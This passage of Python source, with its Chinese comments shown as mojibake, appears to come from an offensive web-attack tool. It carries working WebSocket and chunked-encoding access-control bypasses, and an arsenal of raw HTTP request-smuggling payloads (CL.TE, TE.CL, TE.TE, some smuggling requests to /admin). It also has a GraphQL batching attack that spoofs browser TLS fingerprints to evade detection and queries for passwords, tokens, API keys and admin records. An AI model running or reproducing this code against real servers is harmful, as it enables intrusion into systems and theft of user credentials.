                                        # æ£€æŸ¥å“åº”
                                        if len(data) > 50 and not any(error in data.lower() for error in ['error', 'forbidden', 'denied']):
                                            await ws.close()
                                            result = BypassResult(
                                                success=True,
                                                method='websocket',
                                                url=ws_url,
                                                details={
                                                    'technique': technique['name'],
                                                    'payload': str(payload),
                                                    'response_length': len(data),
                                                    'content': data,
                                                    'headers': {}
                                                },
                                                confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                            )
                                            # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                                            result.confidence = self.scorer.assess(result)
                                            return result
                                except:
                                    continue
                        
                        elif technique['name'] == 'socketio':
                            # Socket.IOç‰¹å®šåè®®
                            # å‘é€Socket.IOæ¡æ‰‹
                            await ws.send_str('2probe')
                            
                            try:
                                msg = await asyncio.wait_for(ws.receive(), timeout=2)
                                if msg.type == aiohttp.WSMsgType.TEXT and '3probe' in msg.data:
                                    # Socket.IOè¿æ¥æˆåŠŸ
                                    # å°è¯•å‘é€äº‹ä»¶è·å–æ•°æ®
                                    await ws.send_str('42["get","/admin"]')
                                    
                                    msg = await asyncio.wait_for(ws.receive(), timeout=2)
                                    if msg.type == aiohttp.WSMsgType.TEXT:
                                        await ws.close()
                                        result = BypassResult(
                                            success=True,
                                            method='websocket',
                                            url=ws_url,
                                            details={
                                                'technique': 'socketio',
                                                'protocol': 'socket.io',
                                                'content': msg.data,
                                                'headers': {}
                                            },
                                            confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                        )
                                        # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                                        result.confidence = self.scorer.assess(result)
                                        return result
                            except:
                                pass
                        
                        await ws.close()
                        
                except aiohttp.WSServerHandshakeError as e:
                    # æ¡æ‰‹å¤±è´¥ï¼Œä½†å¯èƒ½æš´éœ²äº†ä¿¡æ¯
                    if hasattr(e, 'status') and e.status in [101, 426]:
                        # 101 = Switching Protocols (å¯èƒ½æ”¯æŒä½†éœ€è¦ç‰¹å®šæ¡ä»¶)
                        # 426 = Upgrade Required (ç¡®è®¤æ”¯æŒWebSocket)
                        continue
                    
                except aiohttp.ClientError:
                    continue
                except Exception as e:
                    if 'SSL' not in str(e):
                        self.logger.warning(f"[!] WebSocket {technique['name']} å¤±è´¥: {type(e).__name__} - {str(e)[:50]}")
                    continue
        
        return BypassResult(
            success=False,
            method='websocket',
            url=url,
            details={
                'error': f'æ‰€æœ‰WebSocketç»•è¿‡å°è¯•å¤±è´¥ï¼Œå…±æµ‹è¯•{len(websocket_techniques)}ç§æŠ€æœ¯',
                'techniques_tested': [t['name'] for t in websocket_techniques],
                'failure_reason': 'websocket_connection_blocked_or_protocol_unsupported',
                'tested_endpoints': [t['url'] for t in websocket_techniques]
            }
        )
    
    async def _bypass_via_chunked(self, url: str) -> BypassResult:
        """é€šè¿‡åˆ†å—ä¼ è¾“ç¼–ç ç»•è¿‡"""
        try:
            parsed = urllib.parse.urlparse(url)
            
            # æ„å»ºåˆ†å—è¯·æ±‚
            chunked_body = self._create_chunked_payload("test=payload")
            
            headers = {
                'Transfer-Encoding': 'chunked',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            headers.update(self.bypass_headers)
            
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    url,
                    data=chunked_body,
                    headers=headers,
                    ssl=False
                ) as resp:
                    if resp.status in [200, 201]:
                        content = await resp.text()
                        result = BypassResult(
                            success=True,
                            method='chunked_encoding',
                            url=url,
                            details={
                                'content': content,
                                'headers': dict(resp.headers)
                            },
                            confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                        )
                        # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                        result.confidence = self.scorer.assess(result)
                        return result
        except:
            pass
        
        return BypassResult(
            success=False,
            method='chunked_encoding',
            url=url
        )
    
    async def scan_for_smuggling(self, url: str, use_proxy: bool = False) -> SmugglingResult:
        """
        ã€åˆ¶å¯¼ä¸ç¡®è®¤ç³»ç»Ÿã€‘
        æ™ºèƒ½åŒ–HTTPè¯·æ±‚èµ°ç§æ¼æ´æ‰«æ - åŒ…å«åŸºå‡†æµ‹è¯•ã€æ”»å‡»æ¢é’ˆã€ç¡®è®¤æœºåˆ¶
        """
        self.logger.info(f"\n[*] å¯åŠ¨å¯¹ {url} çš„HTTPè¯·æ±‚èµ°ç§æ¼æ´æ‰«æ...")
        
        # --------------------------------------------------------------------
        # æ­¥éª¤ 1: å‘é€åŸºå‡†è¯·æ±‚ï¼Œå»ºç«‹"æ­£å¸¸"çš„æ ‡å‡†
        # --------------------------------------------------------------------
        self.logger.info("    [1/3] æ­£åœ¨å»ºç«‹é€šä¿¡åŸºå‡†...")
        baseline_resp = await self._send_normal_request(url, use_proxy=use_proxy)
        if not baseline_resp:
            self.logger.error("    [!] å»ºç«‹åŸºå‡†å¤±è´¥ï¼Œç›®æ ‡å¯èƒ½æ— æ³•è®¿é—®ã€‚ä¸­æ­¢æ‰«æã€‚")
            return SmugglingResult(evidence="Baseline request failed")
        
        self.logger.info(f"    [+] åŸºå‡†å·²å»ºç«‹: çŠ¶æ€ç ={baseline_resp['status']}, å“åº”æ—¶é—´={baseline_resp['time']:.2f}s")

        # --------------------------------------------------------------------
        # æ­¥éª¤ 2 & 3: å¾ªç¯å‘é€æ”»å‡»æ¢é’ˆï¼Œå¹¶ç«‹å³å‘é€ç¡®è®¤è¯·æ±‚
        # --------------------------------------------------------------------
        self.logger.info("    [2/3] æ­£åœ¨è¿­ä»£å‘é€æ”»å‡»æ¢é’ˆ...")
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.netloc.split(':')[0]
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        use_ssl = parsed_url.scheme == 'https'

        # ä»æ­¦å™¨åº“ä¸­è·å–æ‰€æœ‰èµ°ç§æŠ€æœ¯
        smuggling_payloads = self._get_smuggling_payloads(parsed_url)

        for technique in smuggling_payloads:
            self.logger.info(f"    [*] æµ‹è¯•æŠ€æœ¯: {technique['name']}...")
            
            # å‘é€æ”»å‡»æ¢é’ˆ (åªç®¡å‘é€ï¼Œä¸å…³å¿ƒå“åº”)
            await self._send_smuggling_probe(host, port, technique['payload'], use_ssl)
            
            # ç«‹å³å‘é€ç¡®è®¤è¯·æ±‚
            confirmation_resp = await self._send_normal_request(url, use_proxy=use_proxy)
            if not confirmation_resp:
                self.logger.warning(f"    [!] ç¡®è®¤è¯·æ±‚å¤±è´¥ï¼Œè·³è¿‡æœ¬æ¬¡æŠ€æœ¯æµ‹è¯•ã€‚")
                continue

            # --------------------------------------------------------------------
            # æ­¥éª¤ 4: å¯¹æ¯”åˆ†æï¼Œå¯»æ‰¾å¼‚å¸¸
            # --------------------------------------------------------------------
            analysis_result = self._analyze_smuggling_result(
                baseline=baseline_resp,
                confirmation=confirmation_resp,
                technique=technique['name']
            )

            if analysis_result and analysis_result.vulnerable:
                self.logger.error(f"    [!!!] æ¼æ´ç¡®è®¤ï¼ {analysis_result.evidence}")
                return analysis_result

        self.logger.info("    [3/3] æ‰€æœ‰æ¢é’ˆæµ‹è¯•å®Œæ¯•ï¼Œæœªå‘ç°æ˜æ˜¾æ¼æ´ã€‚")
        return SmugglingResult(vulnerable=False, evidence="No anomalies detected")

    def _get_smuggling_payloads(self, parsed_url) -> list:
        """å‡çº§ç‰ˆèµ°ç§æŠ€æœ¯æ­¦å™¨åº“ - 6ç§æ ¸å¿ƒæŠ€æœ¯"""
        smuggling_payloads = [
            # 1. ç»å…¸ CL.TE
            {
                'name': 'Classic CL.TE',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 6\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"0\r\n\r\n"
                    f"G"
                )
            },
            # 2. ç»å…¸ TE.CL
            {
                'name': 'Classic TE.CL',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 4\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"5c\r\n"
                    f"GPOST /admin HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 10\r\n\r\n"
                    f"x=\r\n"
                    f"0\r\n\r\n"
                )
            },
            # 3. é«˜æ•ˆ CL.TE å˜ä½“ (Content-Length: 0)
            {
                'name': 'CL.TE with Content-Length: 0',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 0\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"0\r\n\r\n"
                    f"G"
                )
            },
            # 4. å¤´éƒ¨æ··æ·†å˜ä½“ (Header Obfuscation)
            {
                'name': 'CL.TE with Header Obfuscation',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 6\r\n"
                    f"Transfer-Encoding : chunked\r\n"  # å†’å·å‰ååŠ ç©ºæ ¼
                    f"\r\n"
                    f"0\r\n\r\n"
                    f"G"
                )
            },
            # 5. æ¢è¡Œç¬¦å˜ä½“ (Bare LF Injection)
            {
                'name': 'CL.TE with Bare LF',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\n"  # ä½¿ç”¨ \n
                    f"Host: {parsed_url.netloc}\n"
                    f"Content-Length: 6\n"
                    f"Transfer-Encoding: chunked\n"
                    f"\n"
                    f"0\n\n"
                    f"G"
                )
            },
            # 6. TE.TE (åŒTransfer-Encodingï¼Œç”¨äºæ··æ·†)
            {
                'name': 'TE.TE with Obfuscation',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 4\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"Transfer-Encoding: cow\r\n"  # æ··æ·†
                    f"\r\n"
                    f"E\r\n"
                    f"GPOST / HTTP/1.1\r\n"  # èµ°ç§çš„å†…å®¹
                    f"\r\n"
                    f"0\r\n\r\n"
                )
            }
        ]
        return smuggling_payloads
    
    async def _send_normal_request(self, url: str, use_proxy: bool = False) -> Optional[Dict]:
        """å‘é€ä¸€ä¸ªæ­£å¸¸çš„GETè¯·æ±‚ï¼Œç”¨äºè·å–åŸºå‡†å’Œç¡®è®¤å“åº”"""
        start_time = time.time()
        try:
            # ä½¿ç”¨TLS-Clientæ¥å‘é€"æ­£å¸¸"è¯·æ±‚ï¼Œç¡®ä¿æŒ‡çº¹çœŸå®
            resp = await self._make_tls_request(url, method='GET', profile='chrome_120', use_proxy=use_proxy)
            response_time = time.time() - start_time
            return {"status": resp['status_code'], "time": response_time}
        except Exception:
            return None

    async def _send_smuggling_probe(self, host: str, port: int, payload: str, use_ssl: bool):
        """å‘é€åŸå§‹çš„èµ°ç§è¯·æ±‚æ¢é’ˆ"""
        try:
            # å»ºç«‹å¼‚æ­¥è¿æ¥ï¼Œè‡ªå¸¦è¶…æ—¶æ§åˆ¶
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=use_ssl, server_hostname=host if use_ssl else None),
                timeout=10  # æ¢é’ˆè¿æ¥è¶…æ—¶
            )
            
            writer.write(payload.encode())
            await writer.drain()
            
            # åªå‘é€ï¼Œä¸å…³å¿ƒå“åº”ï¼ŒçŸ­æš‚ç­‰å¾…åç›´æ¥å…³é—­
            await asyncio.sleep(0.5) 
            writer.close()
            await writer.wait_closed()
        except Exception:
            # å¤±è´¥æ˜¯æ­£å¸¸çš„ï¼Œå› ä¸ºå¾ˆå¤šæ¢é’ˆä¼šè¢«æœåŠ¡å™¨ç›´æ¥å…³é—­è¿æ¥
            pass

    def _analyze_smuggling_result(self, baseline: dict, confirmation: dict, technique: str) -> Optional[SmugglingResult]:
        """å¯¹æ¯”åˆ†æåŸºå‡†å’Œç¡®è®¤å“åº”ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´"""
        result = SmugglingResult(
            baseline_status=baseline['status'],
            confirmation_status=confirmation['status'],
            baseline_time=baseline['time'],
            confirmation_time=confirmation['time']
        )

        # 1. å“åº”æ—¶é—´å¼‚å¸¸ï¼ˆæœ€å¸¸è§çš„æŒ‡æ ‡ï¼‰
        # å¦‚æœç¡®è®¤è¯·æ±‚æ—¶é—´æ¯”åŸºå‡†é•¿5å€ï¼Œå¹¶ä¸”ç»å¯¹æ—¶é—´è¶…è¿‡8ç§’ï¼Œææœ‰å¯èƒ½æ˜¯åç«¯è¶…æ—¶
        if confirmation['time'] > baseline['time'] * 5 and confirmation['time'] > 8.0:
            result.vulnerable = True
            result.technique = technique
            result.evidence = (f"å“åº”æ—¶é—´å¼‚å¸¸: "
                               f"åŸºå‡† {baseline['time']:.2f}s -> "
                               f"ç¡®è®¤ {confirmation['time']:.2f}s (è¶…æ—¶è„±åŒæ­¥)")
            return result

        # 2. çŠ¶æ€ç å¼‚å¸¸
        # å¦‚æœåŸºå‡†æ˜¯200ï¼Œä½†ç¡®è®¤è¯·æ±‚å˜æˆäº†404æˆ–50xï¼Œè¯´æ˜èµ°ç§çš„è¯·æ±‚æ±¡æŸ“äº†è¿æ¥
        if baseline['status'] == 200 and confirmation['status'] in [404, 500, 502, 503, 400]:
            result.vulnerable = True
            result.technique = technique
            result.evidence = (f"çŠ¶æ€ç å¼‚å¸¸: "
                               f"åŸºå‡† {baseline['status']} -> "
                               f"ç¡®è®¤ {confirmation['status']} (è¿æ¥ä¸­æ¯’)")
            return result
        
        return None  # æœªå‘ç°å¼‚å¸¸

    async def _bypass_via_smuggling(self, url: str) -> BypassResult:
        """
        é€šè¿‡HTTPè¯·æ±‚èµ°ç§ç»•è¿‡ - ä½¿ç”¨æ™ºèƒ½åŒ–åˆ¶å¯¼ç¡®è®¤ç³»ç»Ÿ
        å·²å‡çº§ä¸ºåŸºäºåŸºå‡†æµ‹è¯•å’Œç¡®è®¤æœºåˆ¶çš„ç²¾ç¡®æ£€æµ‹
        """
        self.logger.info(f"[*] å¯åŠ¨æ™ºèƒ½åŒ–HTTPè¯·æ±‚èµ°ç§æ£€æµ‹: {url}")
        
        # ä½¿ç”¨æ–°çš„æ™ºèƒ½åŒ–æ‰«æç³»ç»Ÿ
        smuggling_result = await self.scan_for_smuggling(url)
        
        if smuggling_result.vulnerable:
            # è½¬æ¢SmugglingResultä¸ºBypassResult
            result = BypassResult(
                success=True,
                method='http_smuggling_enhanced',
                url=url,
                details={
                    'technique': smuggling_result.technique,
                    'evidence': smuggling_result.evidence,
                    'baseline_status': smuggling_result.baseline_status,
                    'confirmation_status': smuggling_result.confirmation_status,
                    'baseline_time': smuggling_result.baseline_time,
                    'confirmation_time': smuggling_result.confirmation_time,
                    'enhanced_detection': True,
                    'analysis_method': 'baseline_confirmation_system',
                    'content': smuggling_result.evidence,  # ä½¿ç”¨è¯æ®ä½œä¸ºå†…å®¹
                    'headers': {}  # HTTPèµ°ç§é€šå¸¸ä¸è¿”å›æ ‡å‡†å“åº”å¤´
                },
                confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                risk_level='high'
            )
            # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
            result.confidence = self.scorer.assess(result)
            return result
        else:
            # å¦‚æœæ™ºèƒ½åŒ–æ£€æµ‹å¤±è´¥ï¼Œå›é€€åˆ°ä¼ ç»Ÿæ–¹æ³•è¿›è¡Œå¿«é€ŸéªŒè¯
            self.logger.info("    [*] æ™ºèƒ½åŒ–æ£€æµ‹æœªå‘ç°æ¼æ´ï¼Œå°è¯•ä¼ ç»Ÿå¿«é€ŸéªŒè¯...")
            return await self._legacy_smuggling_check(url)

    async def _legacy_smuggling_check(self, url: str) -> BypassResult:
        """
        ä¼ ç»Ÿèµ°ç§æ£€æµ‹æ–¹æ³• - ä½œä¸ºæ™ºèƒ½åŒ–æ£€æµ‹çš„å¤‡ç”¨æ–¹æ¡ˆ
        å¿«é€Ÿæ£€æµ‹ä¸€äº›æ˜æ˜¾çš„èµ°ç§æ¼æ´
        """
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc.split(':')[0]
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        
        # å¿«é€ŸéªŒè¯payload - åªæµ‹è¯•æœ€æœ‰æ•ˆçš„å‡ ç§
        quick_payloads = [
            {
                'name': 'Quick CL.TE',
                'payload': (
                    f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed.netloc}\r\n"
                    f"Content-Length: 6\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"0\r\n\r\n"
                    f"G"
                )
            },
            {
                'name': 'Quick TE.CL',
                'payload': (
                    f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed.netloc}\r\n"
                    f"Content-Length: 4\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"E\r\n"
                    f"GPOST / HTTP/1.1\r\n\r\n"
                    f"0\r\n\r\n"
                )
            }
        ]
        
        for payload in quick_payloads:
            try:
                # å‘é€å¿«é€Ÿæµ‹è¯•payload
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=use_ssl, server_hostname=host if use_ssl else None),
                    timeout=5
                )
                
                writer.write(payload['payload'].encode())
                await writer.drain()
                
                # å¿«é€Ÿæ£€æŸ¥å“åº”
                response = await asyncio.wait_for(reader.read(4096), timeout=3)
                
                # ç®€å•æ£€æŸ¥å¤šé‡HTTPå“åº”
                if response.count(b'HTTP/') > 1:
                    writer.close()
                    await writer.wait_closed()
                    result = BypassResult(
                        success=True,
                        method='http_smuggling_legacy',
                        url=url,
                        details={
                            'technique': payload['name'],
                            'detection_method': 'legacy_quick_check',
                            'response_indicators': 'multiple_http_responses',
                            'content': response.decode('utf-8', errors='ignore'),
                            'headers': {}
                        },
                        confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                        risk_level='high'
                    )
                    # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                    result.confidence = self.scorer.assess(result)
                    return result
                
                writer.close()
                await writer.wait_closed()
                
            except asyncio.TimeoutError:
                # è¶…æ—¶å¯èƒ½æ˜¯èµ°ç§æˆåŠŸçš„æ ‡å¿—
                result = BypassResult(
                    success=True,
                    method='http_smuggling_legacy',
                    url=url,
                    details={
                        'technique': payload['name'],
                        'detection_method': 'timeout_indicator',
                        'evidence': 'Connection timeout suggests desync',
                        'content': 'Connection timeout',
                        'headers': {}
                    },
                    confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                    risk_level='medium'
                )
                # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                result.confidence = self.scorer.assess(result)
                return result
            except Exception:
                continue
        
        return BypassResult(
            success=False,
            method='http_smuggling_enhanced',
            url=url,
            details={
                'error': 'æ‰€æœ‰èµ°ç§æ£€æµ‹æ–¹æ³•å¤±è´¥ï¼Œæ™ºèƒ½åŒ–å’Œä¼ ç»Ÿæ£€æµ‹å‡æœªå‘ç°æ¼æ´',
                'detection_methods': ['intelligent_baseline_confirmation', 'legacy_quick_check'],
                'failure_reason': 'no_smuggling_vulnerability_detected',
                'techniques_tested': len(self._get_smuggling_payloads(urllib.parse.urlparse(url)))
            }
        )
    
    async def scan_for_graphql_batching(self, url: str, use_proxy: bool = False) -> GraphQLResult:
        """
        ã€v2.0ã€‘GraphQLæ‰¹å¤„ç†æ¼æ´æ‰«æ - TLS-Clientå¢å¼º + æ™ºèƒ½è½½è· + ç²¾ç¡®éªŒè¯
        é›†æˆ'éšå½¢æ¶‚å±‚'(TLSæŒ‡çº¹) + 'ç©¿ç”²å¼¹å¤´'(åŠ¨æ€è½½è·) + 'åˆ¶å¯¼ç³»ç»Ÿ'(æ·±åº¦éªŒè¯)
        """
        self.logger.info(f"\n[*] å¯åŠ¨å¯¹ {url} çš„GraphQLæ‰¹å¤„ç†æ¼æ´æ‰«æ (v2.0)...")
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        # --------------------------------------------------------------------
        # ç¬¬ä¸€æ­¥: ä½¿ç”¨TLS-Clientå‘ç°GraphQLç«¯ç‚¹ - 'éšå½¢æ¶‚å±‚'
        # --------------------------------------------------------------------
        common_endpoints = [
            '/graphql', '/api', '/api/graphql', '/graphql/api',
            '/v1/graphql', '/v2/graphql', '/graph', '/query',
            '/gql', '/api/query', '/playground'
        ]
        discovered_endpoint = None
        introspection_possible = False
        
        self.logger.info("    [1/3] æ­£åœ¨ä½¿ç”¨TLSæŒ‡çº¹æ¢æµ‹GraphQLç«¯ç‚¹...")
        
        for endpoint in common_endpoints:
            test_url = base_url + endpoint
            try:
                introspection_query = {"query": "{__schema{types{name}}}"}
                
                # ã€å‡çº§ç‚¹ã€‘ä½¿ç”¨å¼ºå¤§çš„_make_tls_requestæ–¹æ³• - éšå½¢æ¶‚å±‚
                resp = await self._make_tls_request(
                    test_url, 
                    method='POST', 
                    headers={'Content-Type': 'application/json'},
                    json=introspection_query, 
                    profile='chrome_android',  # ä½¿ç”¨ç§»åŠ¨ç«¯æŒ‡çº¹
                    use_proxy=use_proxy
                )
                
                if (resp['status_code'] == 200 and 
                    'data' in resp['text'] and 
                    '__schema' in resp['text']):
                    discovered_endpoint = test_url
                    introspection_possible = True
                    self.logger.info(f"    [+] ç«¯ç‚¹ç¡®è®¤: {discovered_endpoint} (å†…çœå¯ç”¨)")
                    break
                elif resp['status_code'] == 200 and 'data' in resp['text']:
                    # GraphQLç«¯ç‚¹å­˜åœ¨ä½†å†…çœè¢«ç¦ç”¨
                    discovered_endpoint = test_url
                    introspection_possible = False
                    self.logger.info(f"    [+] ç«¯ç‚¹ç¡®è®¤: {discovered_endpoint} (å†…çœè¢«ç¦ç”¨)")
                    break
                    
            except Exception as e:
                self.logger.warning(f"    [!] æµ‹è¯•ç«¯ç‚¹ {endpoint} å¤±è´¥: {type(e).__name__} - {str(e)[:50]}")
                continue
        
        if not discovered_endpoint:
            self.logger.warning("    [-] æœªå‘ç°æ´»åŠ¨çš„GraphQLç«¯ç‚¹ã€‚æ‰«æä¸­æ­¢ã€‚")
            return GraphQLResult(vulnerable=False, evidence="No active GraphQL endpoint found.")

        # --------------------------------------------------------------------
        # ç¬¬äºŒæ­¥: æ„é€ æ™ºèƒ½è½½è· - 'ç©¿ç”²å¼¹å¤´'
        # --------------------------------------------------------------------
        self.logger.info(f"    [2/3] æ­£åœ¨æ„é€ æ™ºèƒ½æ‰¹å¤„ç†è½½è·...")
        
        if introspection_possible:
            # å†…çœé©±åŠ¨ - åŸºäºçœŸå®schemaçš„é«˜ä»·å€¼æŸ¥è¯¢
            self.logger.info("    [*] å†…çœå¯ç”¨ï¼Œæ„é€ åŸºäºschemaçš„è½½è·...")
            batch_payload = [
                {"query": "{__typename}"},  # åŸºç¡€ç±»å‹æŸ¥è¯¢
                {"query": "query viewer { viewer { id name email } }"},  # é«˜ä»·å€¼ç”¨æˆ·æŸ¥è¯¢
                {"query": "{__schema{queryType{name}}}"},  # schemaå…ƒæ•°æ®
                {"query": "query me { me { id username token } }"},  # å½“å‰ç”¨æˆ·æŸ¥è¯¢
                {"query": "query users { users { id name email role } }"}  # ç”¨æˆ·åˆ—è¡¨æŸ¥è¯¢
            ]
        else:
            # æ¨¡ç³Šæµ‹è¯• - é’ˆå¯¹å¸¸è§å­—æ®µçš„æ¢æµ‹è½½è·
            self.logger.info("    [*] å†…çœè¢«ç¦ç”¨ï¼Œä½¿ç”¨æ¨¡ç³Šæµ‹è¯•è½½è·...")
            batch_payload = [
                {"query": "{id,name,email}"},  # åŸºç¡€ç”¨æˆ·å­—æ®µ
                {"query": "{user{id,name,password,token}}"},  # æ•æ„Ÿå­—æ®µæµ‹è¯•
                {"query": "{me{id,email,secret,apiKey}}"},  # APIå¯†é’¥æ¢æµ‹
                {"query": "{viewer{id,username,role,permissions}}"},  # æƒé™æ¢æµ‹
                {"query": "{admin{id,name,email,password}}"}  # ç®¡ç†å‘˜æ¢æµ‹
            ]

        # --------------------------------------------------------------------
        # ç¬¬ä¸‰æ­¥: æ‰§è¡Œæ”»å‡»å¹¶ç²¾ç¡®éªŒè¯ - 'åˆ¶å¯¼ç³»ç»Ÿ'
        # --------------------------------------------------------------------
        self.logger.info(f"    [3/3] å‘ {discovered_endpoint} å‘é€æ‰¹å¤„ç†æ¢é’ˆ...")
        
        try:
            # ä½¿ç”¨ä¸åŒçš„TLSæŒ‡çº¹å‘é€æ‰¹å¤„ç†è¯·æ±‚
            resp = await self._make_tls_request(
                discovered_endpoint,
                method='POST',
                headers={'Content-Type': 'application/json'},
                json=batch_payload,
                profile='okhttp',  # æ¢ä¸€ä¸ªç½•è§çš„æŒ‡çº¹
                use_proxy=use_proxy
            )
            
            # ã€å‡çº§ç‚¹ã€‘ç²¾ç¡®çš„ç»“æœéªŒè¯é€»è¾‘ - åˆ¶å¯¼ç³»ç»Ÿ
            if resp['status_code'] == 200:
                try:
                    json_response = json.loads(resp['text'])
                    
                    # éªŒè¯å“åº”æ ¼å¼ï¼šå¿…é¡»æ˜¯åˆ—è¡¨ä¸”é•¿åº¦åŒ¹é…
                    if isinstance(json_response, list) and len(json_response) == len(batch_payload):
                        self.logger.info(f"    [+] æœåŠ¡å™¨æ”¯æŒæ‰¹å¤„ç†ï¼šæ”¶åˆ° {len(json_response)} ä¸ªå“åº”")
                        
                        # ç»Ÿè®¡æˆåŠŸå’Œå¤±è´¥çš„æŸ¥è¯¢
                        successful_queries = 0
                        error_queries = 0
                        
                        for i, item in enumerate(json_response):
                            if isinstance(item, dict):
                                if 'data' in item and item['data'] is not None:
                                    successful_queries += 1
                                elif 'errors' in item:
                                    error_queries += 1
                        
                        self.logger.info(f"    [*] æŸ¥è¯¢ç»“æœï¼š{successful_queries} æˆåŠŸï¼Œ{error_queries} é”™è¯¯")
                        
                        # åªè¦æœ‰è‡³å°‘ä¸€ä¸ªæŸ¥è¯¢æˆåŠŸï¼Œå°±è®¤ä¸ºæ‰¹å¤„ç†å¯ç”¨
                        if successful_queries > 0:
                            # ã€å‡çº§ç‚¹ã€‘åŠ¨æ€è®¡ç®—ç½®ä¿¡åº¦ - æˆ˜æœè¯„ä¼°ç³»ç»Ÿ
                            confidence = 0.6  # åŸºç¡€ç½®ä¿¡åº¦
                            
                            # åŠ åˆ†é¡¹
                            if successful_queries == len(batch_payload):
                                confidence += 0.2  # æ‰€æœ‰æŸ¥è¯¢éƒ½æˆåŠŸ
                            if introspection_possible:
                                confidence += 0.1  # å†…çœå¯ç”¨
                            if successful_queries >= len(batch_payload) // 2:
                                confidence += 0.05  # å¤§éƒ¨åˆ†æŸ¥è¯¢æˆåŠŸ
                            
                            # å‡åˆ†é¡¹
                            if error_queries > successful_queries:
                                confidence -= 0.1  # é”™è¯¯å¤šäºæˆåŠŸ
                            
                            evidence = (f"æœåŠ¡å™¨æˆåŠŸå¤„ç†äº† {successful_queries}/{len(batch_payload)} ä¸ªæ‰¹å¤„ç†æŸ¥è¯¢ã€‚"
                                      f"å†…çœçŠ¶æ€: {'å¯ç”¨' if introspection_possible else 'è¢«ç¦ç”¨'}ã€‚")
                            
                            self.logger.error(f"    [!!!] æ¼æ´ç¡®è®¤ï¼{evidence}")
                            return GraphQLResult(
                                vulnerable=True,
                                endpoint=discovered_endpoint,
                                evidence=evidence,
                                successful_queries_in_batch=successful_queries,
                                total_queries_in_batch=len(batch_payload),
                                confidence=min(0.95, confidence),
                                introspection_available=introspection_possible
                            )
                        else:
                            return GraphQLResult(
                                vulnerable=False, 
                                endpoint=discovered_endpoint, 
                                evidence=f"æ‰¹å¤„ç†è¿”å› {len(json_response)} ä¸ªå“åº”ï¼Œä½†å…¨éƒ¨å¤±è´¥"
                            )
                    else:
                        return GraphQLResult(
                            vulnerable=False, 
                            endpoint=discovered_endpoint, 
                            evidence=f"å“åº”æ ¼å¼å¼‚å¸¸ï¼šæœŸæœ› {len(batch_payload)} ä¸ªï¼Œå®é™… {len(json_response) if isinstance(json_response, list) else 'not list'}"
                        )
                        
                except (json.JSONDecodeError, TypeError) as e:
                    return GraphQLResult(
                        vulnerable=False, 
                        endpoint=discovered_endpoint, 
                        evidence=f"JSONè§£æå¤±è´¥: {type(e).__name__}"
                    )
            else:
                return GraphQLResult(
                    vulnerable=False, 
                    endpoint=discovered_endpoint, 
                    evidence=f"æ‰¹å¤„ç†è¯·æ±‚å¤±è´¥: HTTP {resp['status_code']}"
                )

        except Exception as e:
            self.logger.error(f"    [!] æ‰¹å¤„ç†æ”»å‡»å¼‚å¸¸: {type(e).__name__} - {str(e)[:100]}")
            return GraphQLResult(
                vulnerable=False, 
                endpoint=discovered_endpoint, 
                evidence=f"æ‰¹å¤„ç†æ”»å‡»å¤±è´¥: {type(e).__name__} - {str(e)[:100]}"
            )

